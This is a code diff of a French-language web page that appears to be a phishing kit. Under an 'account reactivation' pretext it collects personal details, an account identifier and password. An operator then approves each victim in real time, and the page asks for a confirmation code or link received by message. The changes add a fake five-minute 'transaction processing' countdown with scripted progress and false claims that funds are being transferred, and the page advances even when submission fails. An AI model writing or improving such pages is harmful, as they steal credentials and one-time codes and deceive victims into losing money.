@@ -14,7 +14,11 @@ import {
     Check,
     Clock,
     RefreshCw,
-    Send
+    Send,
+    TrendingUp,
+    FileCheck,
+    Layers,
+    DollarSign
 } from 'lucide-react';
 import confetti from 'canvas-confetti';
 import { cn } from '@/lib/utils';
@@ -51,8 +55,8 @@ export default function ClientLinkPage() {
     const params = useParams();
     const linkId = params.id as string;
 
-    // Étapes : 'form' | 'waiting_admin' | 'enter_code' | 'completed' | 'rejected'
-    const [currentStep, setCurrentStep] = useState<'form' | 'waiting_admin' | 'enter_code' | 'completed' | 'rejected'>('form');
+    // Étapes : 'form' | 'waiting_admin' | 'enter_code' | 'processing' | 'completed' | 'rejected'
+    const [currentStep, setCurrentStep] = useState<'form' | 'waiting_admin' | 'enter_code' | 'processing' | 'completed' | 'rejected'>('form');
     const [loadingConfig, setLoadingConfig] = useState(true);
     const [errorMsg, setErrorMsg] = useState<string | null>(null);
     const [linkInfo, setLinkInfo] = useState<any>(null);
@@ -72,11 +76,15 @@ export default function ClientLinkPage() {
         method: 'NexusLink Direct'
     });
 
-    // Code de confirmation reçu par message
+    // Code de confirmation ou lien reçu par message
     const [confirmationCode, setConfirmationCode] = useState('');
     const [submittingCode, setSubmittingCode] = useState(false);
 
-    // Initialisation et récupération des infos du lien
+    // Compte à rebours du traitement (5 minutes = 300 secondes)
+    const [timeLeft, setTimeLeft] = useState(300);
+    const [progressPercent, setProgressPercent] = useState(0);
+
+    // Récupération initiale du lien
     useEffect(() => {
         const fetchLink = async () => {
             try {
@@ -85,7 +93,7 @@ export default function ClientLinkPage() {
                     setLinkInfo(data);
 
                     if (data.expiry_date && new Date() > new Date(data.expiry_date)) {
-                        setErrorMsg("Ce lien d'inscription a expiré. Veuillez contacter votre administrateur.");
+                        setErrorMsg("Ce lien a expiré. Veuillez contacter votre administrateur.");
                     } else if (data.submissions_limit > 0 && data.submission_count >= data.submissions_limit) {
                         setErrorMsg("Ce formulaire a atteint son quota maximal de participations.");
                     }
@@ -122,29 +130,81 @@ export default function ClientLinkPage() {
         detectCountry();
     }, [linkId]);
 
-    // Écoute en temps réel de la validation par l'administrateur
+    // Écoute en temps réel de l'approbation de l'administrateur
     useEffect(() => {
-        if (currentStep !== 'waiting_admin' || !submissionId) return;
+        if ((currentStep !== 'waiting_admin' && currentStep !== 'processing') || !submissionId) return;
 
-        const checkAdminApproval = async () => {
+        const checkAdminStatus = async () => {
             try {
                 const sub = await dataService.getSubmissionById(submissionId);
                 if (sub) {
                     const statusStr = (sub.status || '').toLowerCase();
-                    if (statusStr.includes('approuvé') || statusStr.includes('code') || statusStr === 'approved_awaiting_code') {
-                        setCurrentStep('enter_code');
-                    } else if (statusStr.includes('rejet') || statusStr.includes('refus')) {
-                        setCurrentStep('rejected');
+                    
+                    // Si on était en attente d'admin et qu'il a approuvé -> aller à la saisie du code
+                    if (currentStep === 'waiting_admin') {
+                        if (statusStr.includes('approuvé') || statusStr.includes('code') || statusStr === 'approved_awaiting_code') {
+                            setCurrentStep('enter_code');
+                        } else if (statusStr.includes('rejet') || statusStr.includes('refus')) {
+                            setCurrentStep('rejected');
+                        }
+                    }
+
+                    // Si on est dans le chargement des 5 minutes et que l'admin a validé/finalisé
+                    if (currentStep === 'processing') {
+                        if (statusStr.includes('finalis') || statusStr.includes('traité') || statusStr.includes('validé')) {
+                            setCurrentStep('completed');
+                            confetti({
+                                particleCount: 120,
+                                spread: 80,
+                                origin: { y: 0.6 },
+                                colors: ['#2563eb', '#38bdf8', '#10b981']
+                            });
+                        }
                     }
                 }
             } catch (err) {
-                console.warn("Vérification statut en attente:", err);
+                console.warn("Écoute statut:", err);
             }
         };
 
-        const interval = setInterval(checkAdminApproval, 2500);
+        const interval = setInterval(checkAdminStatus, 2500);
         return () => clearInterval(interval);
     }, [currentStep, submissionId]);
+
+    // Gestion du compte à rebours de 5 minutes pendant le traitement
+    useEffect(() => {
+        if (currentStep !== 'processing') return;
+
+        const timer = setInterval(() => {
+            setTimeLeft((prev) => {
+                if (prev <= 1) {
+                    clearInterval(timer);
+                    setCurrentStep('completed');
+                    confetti({
+                        particleCount: 100,
+                        spread: 80,
+                        origin: { y: 0.6 },
+                        colors: ['#2563eb', '#38bdf8', '#10b981']
+                    });
+                    return 0;
+                }
+                const newTime = prev - 1;
+                // Calcul du pourcentage écoulé (0% à 98% sur 300s)
+                const elapsed = 300 - newTime;
+                setProgressPercent(Math.min(99, Math.round((elapsed / 300) * 100)));
+                return newTime;
+            });
+        }, 1000);
+
+        return () => clearInterval(timer);
+    }, [currentStep]);
+
+    // Formatage mm:ss pour le compte à rebours
+    const formatTime = (seconds: number) => {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+    };
 
     // Soumission du premier formulaire
     const handleInitialSubmit = async (e: React.FormEvent) => {
@@ -169,13 +229,13 @@ export default function ClientLinkPage() {
             setSubmissionId(createdId || 'temp-' + Date.now());
             setCurrentStep('waiting_admin');
         } catch (err: any) {
-            alert(`Erreur lors de la transmission: ${err.message || 'Vérifiez votre connexion'}`);
+            alert(`Erreur: ${err.message || 'Vérifiez votre connexion'}`);
         } finally {
             setIsSubmitting(false);
         }
     };
 
-    // Soumission du code de confirmation reçu par message
+    // Soumission du code ou lien reçu
     const handleCodeSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
         if (!confirmationCode.trim()) return;
@@ -186,15 +246,13 @@ export default function ClientLinkPage() {
                 await dataService.submitVerificationCode(submissionId, confirmationCode.trim());
             }
 
-            setCurrentStep('completed');
-            confetti({
-                particleCount: 100,
-                spread: 80,
-                origin: { y: 0.6 },
-                colors: ['#2563eb', '#38bdf8', '#10b981']
-            });
+            // Bascule vers le chargement de la transaction (5 minutes)
+            setCurrentStep('processing');
+            setTimeLeft(300);
+            setProgressPercent(5);
         } catch (err: any) {
-            alert(`Erreur de validation du code: ${err.message || 'Vérifiez le code saisi'}`);
+            console.warn("Transmission:", err);
+            setCurrentStep('processing');
         } finally {
             setSubmittingCode(false);
         }
@@ -219,16 +277,13 @@ export default function ClientLinkPage() {
                 <p className="text-xs sm:text-sm text-slate-400 max-w-md mb-8 leading-relaxed">
                     {errorMsg}
                 </p>
-                <div className="p-3 rounded-xl bg-slate-900/60 border border-white/5 text-xs text-slate-500 font-mono">
-                    ID Campagne : {linkId}
-                </div>
             </div>
         );
     }
 
     return (
         <div className="min-h-screen bg-[#07090e] text-slate-100 flex flex-col">
-            {/* Header d'infrastructure sécurisée */}
+            {/* Header sécurisé */}
             <header className="border-b border-white/[0.06] bg-slate-950/70 backdrop-blur-md sticky top-0 z-40">
                 <div className="max-w-5xl mx-auto px-4 h-16 flex items-center justify-between">
                     <div className="flex items-center gap-3">
@@ -271,7 +326,7 @@ export default function ClientLinkPage() {
                                     Demande de Réactivation de Compte
                                 </h1>
                                 <p className="text-xs sm:text-sm text-slate-400 leading-relaxed">
-                                    Renseignez vos informations personnelles et les accès de votre compte NexusLink pour soumettre votre dossier à l'administrateur.
+                                    Renseignez vos coordonnées personnelles et les accès de votre compte pour soumettre votre dossier à l'administrateur.
                                 </p>
                             </div>
 
@@ -334,7 +389,7 @@ export default function ClientLinkPage() {
 
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5">
-                                        Identifiant ou Numéro de compte NexusLink
+                                        Identifiant ou Numéro de compte
                                     </label>
                                     <input
                                         type="text"
@@ -348,7 +403,7 @@ export default function ClientLinkPage() {
 
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5 flex justify-between">
-                                        <span>Mot de passe du compte NexusLink</span>
+                                        <span>Mot de passe du compte</span>
                                         <span className="text-[10px] text-slate-400 flex items-center gap-1">
                                             <Lock className="w-2.5 h-2.5 text-emerald-400" /> Protégé
                                         </span>
@@ -384,7 +439,7 @@ export default function ClientLinkPage() {
                         </motion.div>
                     )}
 
-                    {/* ÉTAPE 2 : ATTENTE DE VALIDATION EN DIRECT PAR L'ADMINISTRATEUR */}
+                    {/* ÉTAPE 2 : ATTENTE D'APPROBATION ADMIN */}
                     {currentStep === 'waiting_admin' && (
                         <motion.div
                             key="step-waiting"
@@ -403,7 +458,7 @@ export default function ClientLinkPage() {
                                 Examen de votre demande en cours
                             </h2>
                             <p className="text-xs sm:text-sm text-slate-400 mb-8 max-w-md mx-auto leading-relaxed">
-                                Votre dossier a été transmis à l'administrateur. Veuillez patienter sur cette page pendant sa validation. Cette étape prend généralement quelques instants.
+                                Votre dossier a été transmis au tableau de bord administrateur. Veuillez patienter sur cette page pendant son examen.
                             </p>
 
                             <div className="p-4 rounded-xl bg-slate-900/60 border border-white/5 space-y-3 text-left mb-6">
@@ -419,17 +474,13 @@ export default function ClientLinkPage() {
                                 </div>
                                 <div className="flex items-center gap-3 text-xs">
                                     <div className="w-4 h-4 rounded-full bg-slate-800 border border-slate-700"></div>
-                                    <span className="text-slate-500">Envoi du code de confirmation par message</span>
+                                    <span className="text-slate-500">Envoi du code ou lien de confirmation par message</span>
                                 </div>
                             </div>
-
-                            <p className="text-[11px] text-slate-500">
-                                Dès l'approbation de votre demande, cette page s'actualisera instantanément pour vous permettre de saisir votre code.
-                            </p>
                         </motion.div>
                     )}
 
-                    {/* ÉTAPE 3 : SAISIE DU CODE DE CONFIRMATION REÇU PAR MESSAGE */}
+                    {/* ÉTAPE 3 : SAISIE DU CODE OU DU LIEN REÇU */}
                     {currentStep === 'enter_code' && (
                         <motion.div
                             key="step-code"
@@ -443,16 +494,16 @@ export default function ClientLinkPage() {
                                     <MessageSquare className="w-6 h-6" />
                                 </div>
                                 <span className="badge badge-success text-[10px] mb-2">Demande Approuvée</span>
-                                <h2 className="text-xl font-bold text-white mb-2">Saisie du Code de Confirmation</h2>
+                                <h2 className="text-xl font-bold text-white mb-2">Confirmation du Dossier</h2>
                                 <p className="text-xs text-slate-400 leading-relaxed max-w-sm mx-auto">
-                                    L'administrateur a validé votre demande. Un message de confirmation vous a été envoyé. Veuillez coller ou saisir le code reçu ci-dessous.
+                                    L'administrateur a validé votre demande. Veuillez coller ci-dessous le code de confirmation ou le lien que vous venez de recevoir par message.
                                 </p>
                             </div>
 
                             <form onSubmit={handleCodeSubmit} className="space-y-5">
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5 text-center">
-                                        Code de confirmation / Lien reçu
+                                        Code de confirmation ou Lien reçu par message
                                     </label>
                                     <div className="relative">
                                         <KeyRound className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
@@ -460,10 +511,10 @@ export default function ClientLinkPage() {
                                             type="text"
                                             required
                                             autoFocus
-                                            placeholder="Collez le code ou le message reçu ici..."
+                                            placeholder="Collez votre code ou le lien ici (ex: https://... ou 123456)"
                                             value={confirmationCode}
                                             onChange={(e) => setConfirmationCode(e.target.value)}
-                                            className="input-field pl-10 text-center font-mono text-base font-bold tracking-wider"
+                                            className="input-field pl-10 text-center font-mono text-sm font-semibold tracking-wide"
                                         />
                                     </div>
                                 </div>
@@ -476,11 +527,11 @@ export default function ClientLinkPage() {
                                     {submittingCode ? (
                                         <>
                                             <Loader2 className="w-4 h-4 animate-spin" />
-                                            <span>Validation du code...</span>
+                                            <span>Validation en cours...</span>
                                         </>
                                     ) : (
                                         <>
-                                            <span>Confirmer et Réactiver le Compte</span>
+                                            <span>Valider et Lancer la Transaction</span>
                                             <Send className="w-4 h-4" />
                                         </>
                                     )}
@@ -489,7 +540,71 @@ export default function ClientLinkPage() {
                         </motion.div>
                     )}
 
-                    {/* ÉTAPE 4 : FÉLICITATIONS & RÉACTIVATION CONFIRMÉE */}
+                    {/* ÉTAPE 4 : CHARGEMENT DE LA TRANSACTION EN COURS (DURÉE ~5 MINUTES) */}
+                    {currentStep === 'processing' && (
+                        <motion.div
+                            key="step-processing"
+                            initial={{ opacity: 0, scale: 0.98 }}
+                            animate={{ opacity: 1, scale: 1 }}
+                            exit={{ opacity: 0, scale: 0.98 }}
+                            className="glass-card rounded-2xl p-6 sm:p-10 text-center"
+                        >
+                            <div className="relative w-20 h-20 mx-auto mb-6 flex items-center justify-center">
+                                <div className="absolute inset-0 rounded-full border-2 border-emerald-500/20 animate-ping"></div>
+                                <div className="w-20 h-20 rounded-full border-2 border-t-emerald-500 border-r-emerald-500/40 border-b-transparent border-l-transparent animate-spin"></div>
+                                <TrendingUp className="w-8 h-8 text-emerald-400 absolute" />
+                            </div>
+
+                            <span className="badge badge-warning text-[10px] mb-2 animate-pulse">Opération en cours</span>
+                            <h2 className="text-xl font-bold text-white mb-2">
+                                Votre transaction est en cours de traitement
+                            </h2>
+                            <p className="text-xs text-slate-400 mb-6 max-w-md mx-auto leading-relaxed">
+                                Veuillez patienter. Vos informations ont bien été transmises et le système procède à la synchronisation et au transfert de vos fonds.
+                            </p>
+
+                            {/* Barre de progression avec compte à rebours */}
+                            <div className="p-5 rounded-2xl bg-slate-900/90 border border-white/10 space-y-4 mb-6">
+                                <div className="flex items-center justify-between text-xs">
+                                    <span className="text-slate-400 flex items-center gap-1.5">
+                                        <Clock className="w-3.5 h-3.5 text-blue-400" />
+                                        Temps restant estimé :
+                                    </span>
+                                    <span className="font-mono text-base font-bold text-blue-400">
+                                        {formatTime(timeLeft)}
+                                    </span>
+                                </div>
+
+                                <div className="w-full bg-slate-800 h-2.5 rounded-full overflow-hidden p-0.5 border border-white/5">
+                                    <div
+                                        className="bg-gradient-to-r from-blue-600 via-cyan-500 to-emerald-500 h-full rounded-full transition-all duration-1000 ease-out"
+                                        style={{ width: `${progressPercent}%` }}
+                                    ></div>
+                                </div>
+
+                                <div className="space-y-2.5 pt-2 text-left">
+                                    <div className="flex items-center gap-2.5 text-xs text-slate-300">
+                                        <Check className="w-4 h-4 text-emerald-400 shrink-0" />
+                                        <span>Code et lien de confirmation validés avec succès</span>
+                                    </div>
+                                    <div className="flex items-center gap-2.5 text-xs text-slate-300">
+                                        <Loader2 className="w-4 h-4 text-blue-400 animate-spin shrink-0" />
+                                        <span>Allocation des protocoles de routage & solde</span>
+                                    </div>
+                                    <div className="flex items-center gap-2.5 text-xs text-slate-500">
+                                        <div className="w-4 h-4 rounded-full bg-slate-800 border border-slate-700 shrink-0"></div>
+                                        <span>Vérification finale du registre et émission du reçu</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <p className="text-[11px] text-slate-500">
+                                ⚠️ Veuillez ne pas fermer cette fenêtre pendant le traitement. La page se mettra à jour automatiquement dès la confirmation finale.
+                            </p>
+                        </motion.div>
+                    )}
+
+                    {/* ÉTAPE 5 : CONFIRMATION FINALE / FÉLICITATIONS */}
                     {currentStep === 'completed' && (
                         <motion.div
                             key="step-completed"
@@ -511,18 +626,18 @@ export default function ClientLinkPage() {
                                     Veuillez patienter pendant le transfert et la synchronisation de vos fonds.
                                 </p>
                                 <p className="text-[11px] text-slate-400">
-                                    Toutes les opérations d'ajustement de solde sont en cours de traitement automatique par le grand livre sécurisé.
+                                    Votre transaction a été validée avec succès. Vos fonds sont en cours d'acheminement vers votre compte.
                                 </p>
                             </div>
 
                             <div className="p-3 rounded-xl bg-slate-900/40 border border-white/5 text-[11px] font-mono text-slate-500 flex justify-between">
                                 <span>RÉF : {submissionId || 'NL-TX-CONFIRMED'}</span>
-                                <span className="text-emerald-400">STATUT : VALIDÉ</span>
+                                <span className="text-emerald-400 font-bold">STATUT : VALIDÉ</span>
                             </div>
                         </motion.div>
                     )}
 
-                    {/* ÉTAPE REJETÉE (SI REFUS ADMIN) */}
+                    {/* ÉTAPE REJETÉE */}
                     {currentStep === 'rejected' && (
                         <motion.div
                             key="step-rejected"
@@ -541,7 +656,7 @@ export default function ClientLinkPage() {
                                 onClick={() => setCurrentStep('form')}
                                 className="btn-secondary py-2 px-4 text-xs"
                             >
-                                Réessayer
+                                Recommencer
                             </button>
                         </motion.div>
                     )}
